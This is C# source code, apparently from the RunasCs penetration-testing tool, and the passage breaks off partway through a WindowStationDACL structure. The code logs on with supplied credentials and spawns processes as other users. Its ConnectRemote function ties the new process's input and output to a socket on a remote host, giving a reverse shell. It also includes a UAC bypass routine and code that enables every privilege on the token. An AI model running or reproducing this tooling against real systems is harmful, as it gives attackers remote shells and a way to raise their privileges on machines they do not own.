using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Sockets;
using System.Security.Principal;
using Microsoft.Win32;

public class RunasCsException : Exception
{
    private const string error_string = "[-] RunasCsException: ";

    public RunasCsException(){}

    public RunasCsException(string message) : base(error_string + message){}
}

public class RunasCs
{
    private const Int32 Startf_UseStdHandles = 0x00000100;
    private const int TokenPrimary = 1;
    private const int TokenImpersonation = 2;
    private const int LOGON32_PROVIDER_DEFAULT = 0; 
    private const int LOGON32_PROVIDER_WINNT50 = 3;
    private const int LOGON32_LOGON_INTERACTIVE = 2;
    private const int LOGON32_LOGON_NETWORK = 3;
    private const int LOGON32_LOGON_BATCH = 4;
    private const int LOGON32_LOGON_SERVICE = 5;
    private const int LOGON32_LOGON_UNLOCK = 7;
    private const int LOGON32_LOGON_NETWORK_CLEARTEXT = 8;
    private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
    private const int BUFFER_SIZE_PIPE = 1048576;
    private const uint CREATE_NO_WINDOW = 0x08000000;
    private const uint GENERIC_ALL = 0x10000000;
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
    private const uint DACL_SECURITY_INFORMATION = 0x00000004;
    private const UInt32 LOGON_WITH_PROFILE = 1;
    private const UInt32 LOGON_NETCREDENTIALS_ONLY = 2;
    private const int GetCurrentProcess = -1;

    private IntPtr socket;
    private IntPtr hErrorWrite;
    private IntPtr hOutputRead;
    private IntPtr hOutputWrite;
    private IntPtr hOutputReadTmp;
    private WindowStationDACL stationDaclObj;

    public RunasCs()
    {
        this.hOutputReadTmp = new IntPtr(0);
        this.hOutputRead = new IntPtr(0);
        this.hOutputWrite = new IntPtr(0);
        this.hErrorWrite = new IntPtr(0);
        this.socket = new IntPtr(0);
        this.stationDaclObj = null;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
         public Int32 cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
         public Int32 dwX;
         public Int32 dwY;
         public Int32 dwXSize;
         public Int32 dwYSize;
         public Int32 dwXCountChars;
         public Int32 dwYCountChars;
         public Int32 dwFillAttribute;
         public Int32 dwFlags;
         public Int16 wShowWindow;
         public Int16 cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
         public IntPtr hStdError;
    }

    private struct ProcessInformation
    {
        public IntPtr process;
        public IntPtr thread;
        public int    processId;
        public int    threadId;
    }
    
    [StructLayout(LayoutKind.Sequential)] 
    private struct SECURITY_ATTRIBUTES
    {
        public int    Length;
        public IntPtr lpSecurityDescriptor;
        public bool   bInheritHandle;
    }
    
    private enum SECURITY_IMPERSONATION_LEVEL 
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAData
    {
        internal short wVersion;
        internal short wHighVersion;
        internal short iMaxSockets;
        internal short iMaxUdpDg;
        internal IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        internal string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        internal string szSystemStatus;
    }

    private enum SE_OBJECT_TYPE
    {
        SE_UNKNOWN_OBJECT_TYPE = 0,
        SE_FILE_OBJECT,
        SE_SERVICE,
        SE_PRINTER,
        SE_REGISTRY_KEY,
        SE_LMSHARE,
        SE_KERNEL_OBJECT,
        SE_WINDOW_OBJECT,
        SE_DS_OBJECT,
        SE_DS_OBJECT_ALL,
        SE_PROVIDER_DEFINED_OBJECT,
        SE_WMIGUID_OBJECT,
        SE_REGISTRY_WOW64_32KEY
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROFILEINFO
    {
        public int dwSize;
        public int dwFlags;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpUserName;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpProfilePath;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpDefaultPath;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpServerName;
        [MarshalAs(UnmanagedType.LPTStr)]
        public String lpPolicyPath;
        public IntPtr hProfile;
    }

    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern bool CloseHandle(IntPtr handle);
    
    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();
    
    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken);
    
    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessAsUser(IntPtr hToken,string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,ref STARTUPINFO lpStartupInfo,out ProcessInformation lpProcessInformation);  

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern uint SetSecurityInfo(IntPtr handle, SE_OBJECT_TYPE ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll")]
    static extern bool SetNamedPipeHandleState(IntPtr hNamedPipe, ref UInt32 lpMode, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("userenv.dll", SetLastError=true, CharSet = CharSet.Auto)]
    private static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit );

    [DllImport("userenv.dll", SetLastError=true, CharSet = CharSet.Auto)]
    private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool LoadUserProfile(IntPtr hToken, ref PROFILEINFO lpProfileInfo);

    [DllImport("userenv.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool UnloadUserProfile(IntPtr hToken, IntPtr hProfile);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);

    [DllImport("ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort hostshort);

    [Obsolete]
    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
    static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int closesocket(IntPtr s);
    
    private static string GetProcessFunction(int createProcessFunction){
        if(createProcessFunction == 0)
            return "CreateProcessAsUserW()";
        if(createProcessFunction == 1)
            return "CreateProcessWithTokenW()";
        return "CreateProcessWithLogonW()";
    }
    
    private static bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
    {
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = IntPtr.Zero;
        sa.bInheritHandle = true;
        if (CreatePipe(out hReadPipe, out hWritePipe, ref sa, (uint)BUFFER_SIZE_PIPE))
            return true;
        return false;
    }
    
    private static string ReadOutputFromPipe(IntPtr hReadPipe)
    {
        string output = "";
        uint dwBytesRead = 0;
        byte[] buffer = new byte[BUFFER_SIZE_PIPE];
        if(!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){
            output += "\r\nNo output received from the process.\r\n";
        }
        output += Encoding.Default.GetString(buffer, 0, (int)dwBytesRead);
        return output;
    }

    private static IntPtr ConnectRemote(string[] remote)
    {
        int port = 0;
        int error = 0;
        string host = remote[0];

        try {
            port = Convert.ToInt32(remote[1]);
        } catch {
            throw new RunasCsException("Specified port is invalid: " + remote[1]);
        }

        WSAData data;
        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
            error = WSAGetLastError();
            throw new RunasCsException(String.Format("WSAStartup failed with error code: {0}", error));
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);

        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            throw new RunasCsException(String.Format("WSAConnect failed with error code: {0}", error));
        }

        return socket;
    }

    private static void GetUserEnvironmentBlock(IntPtr hToken, string username, bool forceProfileCreation, out IntPtr lpEnvironment)
    {
        bool success = false;
        lpEnvironment = new IntPtr(0);
        PROFILEINFO profileInfo = new PROFILEINFO();
        if (forceProfileCreation) {
            profileInfo.dwSize = Marshal.SizeOf(profileInfo);
            profileInfo.lpUserName = username;
            success = LoadUserProfile(hToken, ref profileInfo);
            if (success == false && Marshal.GetLastWin32Error() == 1314)
            {
                Console.Out.WriteLine("[*] Warning: LoadUserProfile failed due to insufficient permissions");
                Console.Out.Flush();
            }
        }
        ImpersonateLoggedOnUser(hToken);
        try {
            CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        }
        catch {
            // we land here in a very weird situation, just silently continue
            success = false;
        }
        RevertToSelf();
        if (forceProfileCreation && success) UnloadUserProfile(hToken, profileInfo.hProfile);
    }

    private static bool IsUserProfileDirectoryCreated(string username, string password, string domainName, int logonType) {
        bool result = false;
        IntPtr hToken = IntPtr.Zero;
        result = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
        if (result == false)
            throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
        ImpersonateLoggedOnUser(hToken);
        try
        {
            // obtain USERPROFILE value
            int dwSize = 0;
            GetUserProfileDirectory(hToken, null, ref dwSize);
            StringBuilder profileDir = new StringBuilder(dwSize);
            result = GetUserProfileDirectory(hToken, profileDir, ref dwSize);
        }
        catch {
            // we land here in a very weird situation, just silently continue
            result = true;
        }
        RevertToSelf();
        CloseHandle(hToken);
        return result;
    }

    // UAC bypass discussed in this UAC quiz tweet --> https://twitter.com/splinter_code/status/1458054161472307204
    // thanks @winlogon0 for the implementation --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
    private bool CreateProcessWithLogonWUacBypass(int logonType, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {
        bool result = false;
        IntPtr hToken = new IntPtr(0);
        // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext
        if (logonType == LOGON32_LOGON_NETWORK || logonType == LOGON32_LOGON_BATCH || logonType == LOGON32_LOGON_SERVICE || logonType == LOGON32_LOGON_NETWORK_CLEARTEXT)
            result = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
        else
            result = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ref hToken);
        if (result == false)
            throw new RunasCsException("CreateProcessWithLogonWUacBypass: Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());

        // here we set the IL of the new token equal to our current process IL. Needed or seclogon will fail.
        AccessToken.SetTokenIntegrityLevel(hToken, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
        // remove acl to our current process. Needed for seclogon
        SetSecurityInfo((IntPtr)GetCurrentProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(hToken))
        {
            if (domainName == "") // fixing bugs in seclogon ...
                domainName = ".";
            result = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
        }
        CloseHandle(hToken);
        return result;
    }

    public void CleanupHandles()
    {
        if(this.hOutputReadTmp != IntPtr.Zero) CloseHandle(this.hOutputReadTmp);
        if(this.hOutputRead != IntPtr.Zero) CloseHandle(this.hOutputRead);
        if(this.hOutputWrite != IntPtr.Zero) CloseHandle(this.hOutputWrite);
        if(this.hErrorWrite != IntPtr.Zero) CloseHandle(this.hErrorWrite);
        if(this.socket != IntPtr.Zero) closesocket(this.socket);
        if(this.stationDaclObj != null) this.stationDaclObj.CleanupHandles();
        this.hOutputReadTmp = IntPtr.Zero;
        this.hOutputRead = IntPtr.Zero;
        this.hOutputWrite = IntPtr.Zero;
        this.hErrorWrite = IntPtr.Zero;
        this.socket = IntPtr.Zero;
        this.stationDaclObj = null;
    }

    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool createUserProfile, bool bypassUac)
    /*
        int createProcessFunction:
            0: CreateProcessAsUserW();
            1: CreateProcessWithTokenW();
            2: CreateProcessWithLogonW();
    */
    {
        bool success;
        string output = "";
        string desktopName = "";
        string commandLine = cmd;
        string processPath = null;
        int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
        int logonFlags = (createUserProfile) ? (int)LOGON_WITH_PROFILE : 0;

        IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;

        STARTUPINFO startupInfo = new STARTUPINFO();
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpReserved = null;

        this.stationDaclObj = new WindowStationDACL();
        ProcessInformation processInfo = new ProcessInformation();

        if (processTimeout > 0) {
            if (!CreateAnonymousPipeEveryoneAccess(ref this.hOutputReadTmp, ref this.hOutputWrite)) {
                throw new RunasCsException("CreatePipe failed with error code: " + Marshal.GetLastWin32Error());
            }
            //1998's code. Old but gold https://support.microsoft.com/en-us/help/190351/how-to-spawn-console-processes-with-redirected-standard-handles
            if (!DuplicateHandle(hCurrentProcess, this.hOutputWrite, hCurrentProcess, out this.hErrorWrite, 0, true, DUPLICATE_SAME_ACCESS)) {
                throw new RunasCsException("DuplicateHandle stderr write pipe failed with error code: " + Marshal.GetLastWin32Error());
            }
            if (!DuplicateHandle(hCurrentProcess, this.hOutputReadTmp, hCurrentProcess, out this.hOutputRead, 0, false, DUPLICATE_SAME_ACCESS)) {
                throw new RunasCsException("DuplicateHandle stdout read pipe failed with error code: " + Marshal.GetLastWin32Error());
            }
            CloseHandle(this.hOutputReadTmp);
            this.hOutputReadTmp = IntPtr.Zero;

            UInt32 PIPE_NOWAIT = 0x00000001;
            if (!SetNamedPipeHandleState(this.hOutputRead, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero)) {
                throw new RunasCsException("SetNamedPipeHandleState failed with error code: " + Marshal.GetLastWin32Error());
            }

            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdOutput = this.hOutputWrite;
            startupInfo.hStdError = this.hErrorWrite;
            processPath = Environment.GetEnvironmentVariable("ComSpec");
            commandLine = "/c " + cmd;

        } else if (remote != null) {
            this.socket = ConnectRemote(remote);
            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdInput = this.socket;
            startupInfo.hStdOutput = this.socket;
            startupInfo.hStdError = this.socket;
        }

        desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType);
        startupInfo.lpDesktop = desktopName;

        if (logonType != LOGON32_LOGON_NEW_CREDENTIALS && !createUserProfile && !IsUserProfileDirectoryCreated(username, password, domainName, logonType)) {
            Console.Out.WriteLine("[*] Warning: User profile directory for user " + username + " does not exists. Probably this user never logged on on this machine.");
            Console.Out.Flush();
        }

        if(createProcessFunction == 2){
            if (logonType != LOGON32_LOGON_INTERACTIVE && logonType != LOGON32_LOGON_NEW_CREDENTIALS && !bypassUac) {
                Console.Out.WriteLine("[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type " + logonType.ToString() + ". Reverting to logon type Interactive (2)...");
                Console.Out.Flush();
            }
            if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
            {
                if (domainName == "")
                    domainName = ".";
                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                if (success == false)
                    throw new RunasCsException("CreateProcessWithLogonW logon type 9 failed with " + Marshal.GetLastWin32Error());
            }
            else {
                IntPtr hTokenUacCheck = new IntPtr(0);
                // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
                success = LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck);
                if (success == false)
                    throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
                if (AccessToken.IsLimitedUACToken(hTokenUacCheck, username, domainName, password))
                {
                    if (bypassUac)
                    {
                        success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, processPath, commandLine, ref startupInfo, out processInfo);
                        if (success == false)
                            throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                    }
                    else
                    {
                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
                        Console.Out.Flush();
                        success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                        if (success == false)
                            throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
                    }
                }
                else {
                    success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, processPath, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
                    if (success == false)
                        throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
                }
                CloseHandle(hTokenUacCheck);
            }
        } else {
            IntPtr hToken = new IntPtr(0);
            IntPtr hTokenDuplicate = new IntPtr(0);
            if(logonType == LOGON32_LOGON_NEW_CREDENTIALS)
                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_WINNT50, ref hToken);
            else
                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
            if(success == false)
                throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());

            SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
            sa.bInheritHandle       = true;
            sa.Length               = Marshal.SizeOf(sa);
            sa.lpSecurityDescriptor = (IntPtr)0;
            success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenPrimary, ref hTokenDuplicate);
            if(success == false)
                throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());

            if (AccessToken.IsLimitedUACToken(hTokenDuplicate, username, domainName, password))
            {
                if (bypassUac)
                {
                    success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, processPath, commandLine, ref startupInfo, out processInfo);
                    if (success == false)
                        throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                }
                else
                {
                    if (logonType == LOGON32_LOGON_INTERACTIVE || logonType == 11 /*CachedInteractive*/){ // only these logon types are filtered by UAC
                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
                        Console.Out.Flush();
                    }
                }
            }
            else
                bypassUac = false; // we reset this flag as it's not considered when token is not limited

            if (!bypassUac) {
                // enable all privileges assigned to the token
                if (logonType != LOGON32_LOGON_NETWORK && logonType != LOGON32_LOGON_NETWORK_CLEARTEXT)
                    AccessToken.EnableAllPrivileges(hTokenDuplicate);

                if (createProcessFunction == 0)
                {
                    // obtain environmentBlock for desired user
                    IntPtr lpEnvironment = IntPtr.Zero;
                    GetUserEnvironmentBlock(hTokenDuplicate, username, createUserProfile, out lpEnvironment);
                    //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
                    success = CreateProcessAsUser(hTokenDuplicate, processPath, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
                    if (success == false)
                        throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
                    if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
                }
                else if (createProcessFunction == 1)
                {
                    success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, processPath, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo);
                    if (success == false)
                        throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
                }

                
            }
            CloseHandle(hToken);
            CloseHandle(hTokenDuplicate);
        }

        if(processTimeout > 0) {
            CloseHandle(this.hOutputWrite);
            CloseHandle(this.hErrorWrite);
            this.hOutputWrite = IntPtr.Zero;
            this.hErrorWrite = IntPtr.Zero;
            WaitForSingleObject(processInfo.process, processTimeout);
            output += ReadOutputFromPipe(this.hOutputRead);
        } else {
            output += "[+] Running in session " + sessionId.ToString() + " with process function " + GetProcessFunction(createProcessFunction) + "\r\n";
            output += "[+] Using Station\\Desktop: " + desktopName + "\r\n";
            output += "[+] Async process '" + commandLine + "' with pid " + processInfo.processId + " created and left in background.\r\n";
        }

        CloseHandle(processInfo.process);
        CloseHandle(processInfo.thread);
        this.CleanupHandles();
        return output;
    }
}

public class WindowStationDACL{
   
    private const int UOI_NAME = 2;
    private const int ERROR_INSUFFICIENT_BUFFER = 122;
    private const uint SECURITY_DESCRIPTOR_REVISION = 1;
    private const uint ACL_REVISION = 2;
    private const uint MAXDWORD = 0xffffffff;
    private const byte ACCESS_ALLOWED_ACE_TYPE = 0x0;
    private const byte CONTAINER_INHERIT_ACE = 0x2;
    private const byte INHERIT_ONLY_ACE = 0x8;
    private const byte OBJECT_INHERIT_ACE = 0x1;
    private const byte NO_PROPAGATE_INHERIT_ACE = 0x4;
    private const int NO_ERROR = 0;
    private const int ERROR_INVALID_FLAGS = 1004; // On Windows Server 2003 this error is/can be returned, but processing can still continue
    
    [Flags]
    private enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,

        STANDARD_RIGHTS_REQUIRED = 0x000F0000,

        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,

        STANDARD_RIGHTS_ALL = 0x001F0000,

        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

        ACCESS_SYSTEM_SECURITY = 0x01000000,

        MAXIMUM_ALLOWED = 0x02000000,

        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        GENERIC_ACCESS = GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | GENERIC_ALL,

        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        DESKTOP_ALL = (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                    DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                    DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP |
                    STANDARD_RIGHTS_REQUIRED),

        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL =  (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | 
                   WINSTA_CREATEDESKTOP    | WINSTA_ENUMDESKTOPS      | 
                   WINSTA_ENUMERATE        | WINSTA_EXITWINDOWS       | 
                   WINSTA_READATTRIBUTES   | WINSTA_READSCREEN        | 
                   WINSTA_WRITEATTRIBUTES  | DELETE                   | 
                   READ_CONTROL            | WRITE_DAC                | 
                   WRITE_OWNER)
    }
    
    [Flags] 
    private enum SECURITY_INFORMATION : uint
    {
        OWNER_SECURITY_INFORMATION        = 0x00000001,
        GROUP_SECURITY_INFORMATION        = 0x00000002,
        DACL_SECURITY_INFORMATION         = 0x00000004,
        SACL_SECURITY_INFORMATION         = 0x00000008,
        UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
        UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
        PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000,
        PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
    }
    
    private enum ACL_INFORMATION_CLASS
    {
        AclRevisionInformation = 1,
        AclSizeInformation = 2
    }
    
    private enum SID_NAME_USE
    {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct SidIdentifierAuthority
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
        public byte[] Value;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACL_SIZE_INFORMATION
    {
        public uint AceCount;
        public uint AclBytesInUse;
        public uint AclBytesFree;
